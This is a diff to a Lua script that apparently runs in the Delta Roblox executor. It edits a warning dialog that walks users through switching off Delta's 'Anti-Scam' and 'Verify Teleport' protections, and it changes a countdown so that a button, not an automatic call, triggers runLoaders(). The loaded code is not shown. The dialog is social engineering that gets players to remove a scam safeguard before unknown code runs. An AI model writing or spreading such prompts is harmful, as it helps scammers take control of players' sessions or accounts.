@@ -103,7 +103,7 @@ local function showDeltaWarning()
     Label.RichText = true
     Label.Text = 'The script requires teleport permission, which is currently blocked by Delta\'s <font color="rgb(255,220,0)">Anti-Scam</font>.\n\n1) Tap the Delta icon at the top.\n2) Open Settings (gear icon).\n3) Turn <font color="rgb(255,60,60)">OFF</font> the "<font color="rgb(255,220,0)">Anti-Scam</font>" & "<font color="rgb(255,220,0)">Verify Teleport</font>" option.\n4) Rejoin and run the script again.'
 
-    -- Button: Countdown (auto execute)
+    -- Button: Open Script (locked until countdown ends)
     local OpenBtn = Instance.new("TextButton")
     OpenBtn.Parent = Frame
     OpenBtn.Size = UDim2.new(0, 180, 0, 44)
@@ -113,10 +113,10 @@ local function showDeltaWarning()
     OpenBtn.Font = Enum.Font.SourceSansBold
     OpenBtn.TextSize = 16
     OpenBtn.AutoButtonColor = false
-    OpenBtn.Active = false
+    OpenBtn.Active = false -- locked initially
     Instance.new("UICorner", OpenBtn).CornerRadius = UDim.new(0, 10)
 
-    -- Countdown logic
+    -- Countdown logic (button unlocks after countdown)
     local countdown = 5
     local interval = 0.01
 
@@ -127,9 +127,16 @@ local function showDeltaWarning()
             countdown -= interval
         end
 
-        OpenBtn.Text = "Running..."
-        runLoaders()
-        ScreenGui:Destroy()
+        -- Unlock button instead of auto-execute
+        OpenBtn.Text = "Open Script"
+        OpenBtn.Active = true
+        OpenBtn.AutoButtonColor = true
+
+        OpenBtn.MouseButton1Click:Connect(function()
+            OpenBtn.Text = "Running..."
+            runLoaders()
+            ScreenGui:Destroy()
+        end)
     end)
 
     -- Button: Rejoin
